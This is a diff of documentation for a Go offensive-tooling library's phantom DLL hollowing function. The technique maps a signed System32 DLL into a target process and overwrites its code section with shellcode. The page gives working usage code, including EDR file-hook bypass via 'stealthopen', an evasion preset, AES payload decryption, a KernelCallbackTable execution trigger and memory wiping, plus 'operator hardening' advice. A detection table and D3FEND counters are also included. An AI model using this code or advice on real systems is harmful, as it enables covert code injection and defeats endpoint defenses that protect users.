@@ -1,139 +1,255 @@
-# Phantom DLL Hollowing
+---
+package: github.com/oioio-space/maldev/inject
+last_reviewed: 2026-04-27
+reflects_commit: 4798780
+---
 
-> **MITRE ATT&CK:** T1055.001 -- Process Injection: DLL Injection | **D3FEND:** D3-SICA -- System Image Change Analysis | **Detection:** Low-Medium
+# Phantom DLL hollowing
+
+[← injection index](README.md) · [docs/index](../../index.md)
+
+## TL;DR
+
+Cross-process module stomping: open a real System32 DLL, build a
+`SEC_IMAGE` section from it, map the section into the target so the
+kernel records the mapping as a legitimate signed image, then overwrite
+the `.text` of the remote view with shellcode. Memory scanners see a
+file-backed amsi.dll mapping; the bytes are the implant's. Optionally
+routes the open through [`evasion/stealthopen`](../evasion/ntdll-unhooking.md)
+to dodge path-based file hooks.
 
 ## Primer
 
-Imagine a company issues official ID badges with photos and names. Each badge is linked to an entry in the security database showing the employee's identity and department. Now picture cloning a real badge -- it has the correct hologram, the correct barcode, and scans as a legitimate employee in the database. But the photo on the badge is yours. When the security guard checks the badge, it scans as valid. They would have to look very closely at the photo to notice anything wrong.
+Module stomping ([local](module-stomping.md)) gives an RX region that
+the OS reports as a legitimate signed image — but only inside the
+implant's own process. Phantom DLL hollowing extends the same idea
+across a process boundary by combining `NtCreateSection(SEC_IMAGE)`
+with `NtMapViewOfSection` into the target.
 
-Phantom DLL hollowing creates a section from a real, Microsoft-signed DLL on disk using `SEC_IMAGE`, which tells Windows to treat it as a proper module image. The kernel validates the file signature and creates a section backed by the DLL file. This section is then mapped into the target process. Memory scanners see a file-backed image region pointing to a legitimate System32 DLL -- exactly what they expect. But the `.text` section of this mapped image has been overwritten with shellcode. Integrity checking tools would need to compare every byte against the on-disk copy to detect the modification.
+The kernel insists that `SEC_IMAGE` sections be backed by an Authenticode-
+signed file; the implant uses a real System32 DLL (`amsi.dll`,
+`msftedit.dll`, …) so the signature check passes. The same pages are
+then overwritten in the **target's** view: read the on-disk DLL to
+locate the `.text` RVA, flip the remote section to RW with
+`VirtualProtectEx`, write the shellcode, flip back to RX. The remote
+process now has an `amsi.dll` mapping whose code segment is the implant.
 
-This technique combines the file-backing trust of module stomping with the cross-process capability of section mapping, making it one of the stealthiest remote injection methods.
+EDR memory scanners that key on "is this image-backed and signed?"
+report green. Defenders that compare in-memory bytes against the on-disk
+copy see the divergence.
 
-## How It Works
+## How it works
 
 ```mermaid
-flowchart TD
-    A[Open legitimate DLL file\nfrom System32] --> B[NtCreateSection\nSEC_IMAGE + PAGE_READONLY]
-    B --> C[Kernel validates\nfile signature]
-    C --> D[NtMapViewOfSection\ninto target process]
-    D --> E[Parse PE headers\nlocate .text RVA + size]
-    E --> F[VirtualProtectEx\n.text → RW]
-    F --> G[WriteProcessMemory\nshellcode → .text]
-    G --> H[VirtualProtectEx\n.text → RX]
+sequenceDiagram
+    participant Impl as Implant
+    participant Open as stealthopen.Opener (optional)
+    participant Kern as Kernel
+    participant Tgt as Target
 
-    style A fill:#1a3a5c,color:#fff
-    style C fill:#2d5016,color:#fff
-    style G fill:#5c1a1a,color:#fff
-    style H fill:#2d5016,color:#fff
+    Impl->>Open: open amsi.dll
+    Open-->>Impl: hFile
+    Impl->>Kern: NtCreateSection(SEC_IMAGE, hFile)
+    Kern->>Kern: Authenticode validation
+    Kern-->>Impl: hSection (image-backed)
+
+    Impl->>Kern: NtMapViewOfSection(target, RX)
+    Kern->>Tgt: legitimate amsi.dll image mapped
+    Kern-->>Impl: remoteBase
+
+    Impl->>Impl: parse local copy of amsi.dll PE → text RVA, size
+    Impl->>Kern: NtProtectVirtualMemory(target, .text → RW)
+    Impl->>Kern: NtWriteVirtualMemory(target, .text ← shellcode)
+    Impl->>Kern: NtProtectVirtualMemory(target, .text → RX)
 ```
 
-**Step-by-step:**
+Steps:
 
-1. **Open DLL file** -- Open a legitimate System32 DLL (e.g., `amsi.dll`) with `GENERIC_READ` access. Also read a local copy for PE parsing.
-2. **NtCreateSection(SEC_IMAGE)** -- Create a section with `SEC_IMAGE` type. The kernel treats this as a module image, validates it, and creates a section backed by the DLL file.
-3. **OpenProcess** -- Get a handle to the target process with `VM_OPERATION | VM_WRITE | VM_READ`.
-4. **NtMapViewOfSection** -- Map the section into the target process with `PAGE_EXECUTE_READWRITE`. The target now has what looks like a legitimately loaded DLL.
-5. **Parse PE headers** -- Find the `.text` section's RVA and size from the local copy of the DLL.
-6. **VirtualProtectEx(RW)** -- Make the remote `.text` section writable.
-7. **WriteProcessMemory** -- Overwrite the `.text` bytes with shellcode.
-8. **VirtualProtectEx(RX)** -- Restore execute-read permissions on `.text`.
+1. **Open** the cover DLL (default `amsi.dll`). When an `Opener` is
+   supplied, the open routes through file-ID handles rather than a
+   path-based `CreateFile`, defeating EDR file-IO hooks that key on
+   path strings.
+2. **`NtCreateSection(SEC_IMAGE)`** — kernel validates and builds a
+   signed image section.
+3. **`NtMapViewOfSection`** into the target with `PAGE_EXECUTE_READWRITE`.
+4. **Parse** the cover DLL's PE headers in the implant to locate the
+   `.text` RVA and size.
+5. **Flip + write + flip back** the target's `.text` via
+   `VirtualProtectEx` + `WriteProcessMemory` + `VirtualProtectEx`.
+6. (Caller's responsibility) trigger the shellcode in the target —
+   `KernelCallbackExec`, `SectionMapInject`-paired thread, callback
+   APC.
 
-## Usage
+## API Reference
+
+### `inject.PhantomDLLInject(pid int, dllName string, shellcode []byte, opener stealthopen.Opener) error`
+
+[godoc](https://pkg.go.dev/github.com/oioio-space/maldev/inject#PhantomDLLInject)
+
+Inject `shellcode` into `pid`'s address space, masquerading as the
+loaded image of `dllName`.
+
+**Parameters:**
+- `pid` — target. Needs `PROCESS_VM_OPERATION`, `PROCESS_VM_WRITE`,
+  `PROCESS_QUERY_INFORMATION`.
+- `dllName` — System32 leaf (e.g. `"amsi.dll"`). The package resolves
+  to the absolute path under `%SystemRoot%\System32\` if no path is
+  given.
+- `shellcode` — bytes to write over `.text`. Must be ≤ the cover
+  DLL's `.text` size.
+- `opener` — optional [`stealthopen.Opener`](../evasion/stealthopen.md).
+  Routes both the PE-parse read and the `NtCreateSection` handle
+  through file-ID-based opens, bypassing path-based file-IO hooks.
+  Pass `nil` for the path-based default.
+
+**Returns:** `error` — wraps file-open / `NtCreateSection` /
+`NtMapViewOfSection` / `WriteProcessMemory` / `VirtualProtectEx`
+failures. Reports if the shellcode exceeds the cover DLL's `.text`.
+
+**Side effects:** maps a `SEC_IMAGE` section into the target. The
+mapping persists until the target exits.
+
+**OPSEC:** **does not trigger** — caller must run the shellcode (e.g.
+[`KernelCallbackExec`](kernel-callback-table.md), an APC, a thread).
+
+## Examples
+
+### Simple
 
 ```go
-package main
+import "github.com/oioio-space/maldev/inject"
 
-import (
-    "log"
-
-    "github.com/oioio-space/maldev/inject"
-)
-
-func main() {
-    shellcode := []byte{0x90, 0x90, 0xCC}
-
-    // Inject into PID 1234 using amsi.dll as the phantom module.
-    // 4th arg is an optional stealthopen.Opener — nil = path-based
-    // CreateFile of System32\amsi.dll; pass a *stealthopen.Stealth
-    // to route BOTH the PE-parse read AND the NtCreateSection HANDLE
-    // through OpenFileById, bypassing path-based EDR file hooks.
-    if err := inject.PhantomDLLInject(1234, "amsi.dll", shellcode, nil); err != nil {
-        log.Fatal(err)
-    }
+if err := inject.PhantomDLLInject(targetPID, "amsi.dll", shellcode, nil); err != nil {
+    return err
 }
+// caller now triggers the shellcode separately.
 ```
 
-## Combined Example
+### Composed (stealthopen for the file open)
+
+Defeat path-based EDR file hooks on `amsi.dll`:
 
 ```go
-package main
-
 import (
-    "log"
     "os"
     "path/filepath"
 
+    "github.com/oioio-space/maldev/evasion/stealthopen"
+    "github.com/oioio-space/maldev/inject"
+)
+
+sys32 := filepath.Join(os.Getenv("SYSTEMROOT"), "System32")
+opener, _ := stealthopen.New(filepath.Join(sys32, "amsi.dll"))
+defer opener.Close()
+
+return inject.PhantomDLLInject(targetPID, "amsi.dll", shellcode, opener)
+```
+
+### Advanced (phantom + KCT trigger)
+
+End-to-end placement + execution:
+
+```go
+import (
+    "github.com/oioio-space/maldev/inject"
+    wsyscall "github.com/oioio-space/maldev/win/syscall"
+)
+
+if err := inject.PhantomDLLInject(targetPID, "msftedit.dll", shellcode, nil); err != nil {
+    return err
+}
+
+caller := wsyscall.New(wsyscall.MethodIndirect, nil)
+return inject.KernelCallbackExec(targetPID, shellcode, caller)
+```
+
+### Complex (decrypt + stealthopen + phantom + trigger + wipe)
+
+```go
+import (
+    "os"
+    "path/filepath"
+
+    "github.com/oioio-space/maldev/cleanup/memory"
+    "github.com/oioio-space/maldev/crypto"
     "github.com/oioio-space/maldev/evasion"
     "github.com/oioio-space/maldev/evasion/preset"
     "github.com/oioio-space/maldev/evasion/stealthopen"
     "github.com/oioio-space/maldev/inject"
-    "github.com/oioio-space/maldev/process/enum"
+    wsyscall "github.com/oioio-space/maldev/win/syscall"
 )
 
-func main() {
-    shellcode := []byte{0x90, 0x90, 0xCC}
+caller := wsyscall.New(wsyscall.MethodIndirect, nil)
+_ = evasion.ApplyAll(preset.Stealth(), caller)
 
-    // 1. Apply stealth evasion preset.
-    evasion.ApplyAll(preset.Stealth(), nil)
+shellcode, err := crypto.DecryptAESGCM(aesKey, encrypted)
+if err != nil { return err }
+memory.SecureZero(aesKey)
 
-    // 2. Find target process.
-    procs, _ := enum.List()
-    var targetPID int
-    for _, p := range procs {
-        if p.Name == "explorer.exe" {
-            targetPID = int(p.PID)
-            break
-        }
-    }
+sys32 := filepath.Join(os.Getenv("SYSTEMROOT"), "System32")
+opener, _ := stealthopen.New(filepath.Join(sys32, "amsi.dll"))
+defer opener.Close()
 
-    // 3. Phantom DLL injection using a rarely-loaded DLL.
-    //    The mapped region appears as a legitimate amsi.dll image.
-    //    Pre-capture the Object ID to also defeat path-based CreateFile
-    //    hooks on the amsi.dll open.
-    sys32 := filepath.Join(os.Getenv("SYSTEMROOT"), "System32")
-    stealth, _ := stealthopen.NewStealth(filepath.Join(sys32, "amsi.dll"))
-
-    if err := inject.PhantomDLLInject(targetPID, "amsi.dll", shellcode, stealth); err != nil {
-        log.Fatal(err)
-    }
-
-    // Note: You still need a separate execution trigger (thread, APC, etc.)
-    // PhantomDLLInject only writes the shellcode into the mapped image.
+if err := inject.PhantomDLLInject(targetPID, "amsi.dll", shellcode, opener); err != nil {
+    return err
 }
+memory.SecureZero(shellcode)
+
+return inject.KernelCallbackExec(targetPID, shellcode, caller)
 ```
 
-## Advantages & Limitations
+## OPSEC & Detection
 
-| Aspect | Detail |
-|--------|--------|
-| Stealth | Very high -- memory region is `SEC_IMAGE` backed by a real System32 DLL. Memory scanners trust file-backed image regions. |
-| File backing | The section is genuinely backed by the on-disk DLL file. `!vad` in WinDbg shows the file path. |
-| Cross-process | Yes -- maps into any process you can open with VM_WRITE access. |
-| Size constraint | Shellcode must fit in the target DLL's `.text` section. Choose a DLL with a large `.text`. |
-| Limitations | Does not provide execution -- you need a separate trigger mechanism. Uses `WriteProcessMemory` (monitored). Advanced scanners can detect `.text` integrity violations by comparing mapped bytes against disk. |
-| DLL selection | Use DLLs not commonly loaded by the target to avoid conflicts: `amsi.dll`, `dbghelp.dll`, `msftedit.dll`. |
+| Artefact | Where defenders look |
+|---|---|
+| `SEC_IMAGE` section in a target backed by a DLL the target does not import | Sysmon Event 7 (ImageLoad) — anomaly when the host process does not depend on the cover DLL |
+| In-memory `.text` mismatch with the on-disk DLL | Image-integrity scanners — strong, slow detector |
+| Cross-process `WriteProcessMemory` to an image's `.text` | EDR userland hooks + ETW-Ti `WriteVirtualMemory` |
+| `VirtualProtectEx` flip on a loaded image | EDR allocation-protect telemetry |
 
-## API Reference
+**D3FEND counters:**
 
-```go
-// PhantomDLLInject creates a section from a legitimate System32 DLL,
-// maps it into the target process, and overwrites the .text section
-// with shellcode. The memory scanner sees a file-backed image.
-//
-// opener is optional (nil = path-based os.Open + CreateFile). Pass a
-// *stealthopen.Stealth pre-captured for the target System32 DLL to
-// route the PE-parse read AND the NtCreateSection HANDLE through
-// OpenFileById — path-based EDR hooks on System32 DLL opens never fire.
-func PhantomDLLInject(pid int, dllName string, shellcode []byte, opener stealthopen.Opener) error
-```
+- [D3-PCSV](https://d3fend.mitre.org/technique/d3f:ProcessCodeSegmentVerification/)
+  — image-integrity verification.
+- [D3-SICA](https://d3fend.mitre.org/technique/d3f:SystemImageChangeAnalysis/)
+  — image-change analysis on loaded modules.
+
+**Hardening for the operator:** route the file open through
+[`stealthopen`](../evasion/stealthopen.md); pick a cover DLL that the
+target is unlikely to actually import (so the load looks load-but-unused
+rather than overlapping legitimate use); pair with ntdll unhooking.
+
+## MITRE ATT&CK
+
+| T-ID | Name | Sub-coverage | D3FEND counter |
+|---|---|---|---|
+| [T1055.001](https://attack.mitre.org/techniques/T1055/001/) | Process Injection: DLL Injection | image-backed cross-process variant | D3-PCSV |
+| [T1574.002](https://attack.mitre.org/techniques/T1574/002/) | Hijack Execution Flow: DLL Side-Loading | adjacent — phantom DLL imitates side-loading without actual hijack | D3-SICA |
+
+## Limitations
+
+- **`WriteProcessMemory` still fires.** The technique avoids the
+  *allocation* anomaly (image-backed instead of heap), not the
+  cross-process write itself.
+- **Non-trigger.** `PhantomDLLInject` only places the shellcode. The
+  caller picks the trigger ([`KernelCallbackExec`](kernel-callback-table.md),
+  APC, thread).
+- **Cover DLL must not be already loaded with dependencies in target.**
+  If `amsi.dll` is already mapped because AMSI is in use, the new
+  `SEC_IMAGE` mapping conflicts. Pick a DLL the target does not load
+  (verify via Process Explorer first).
+- **Image-diff defeats it.** Defenders that compare loaded `.text`
+  against the on-disk DLL win.
+
+## See also
+
+- [Module Stomping](module-stomping.md) — local, in-process variant
+  of the same technique.
+- [Section Mapping](section-mapping.md) — non-image-backed
+  cross-process placement.
+- [KernelCallbackTable](kernel-callback-table.md) — the canonical
+  trigger paired with `PhantomDLLInject`.
+- [`evasion/stealthopen`](../evasion/stealthopen.md) — defeat
+  path-based file-IO hooks on the cover DLL open.
+- [Forrest Orr, *Phantom DLL Hollowing*, 2020](https://www.forrest-orr.net/post/masking-malicious-memory-artifacts-part-i-phantom-dll-hollowing)
+  — original public write-up.
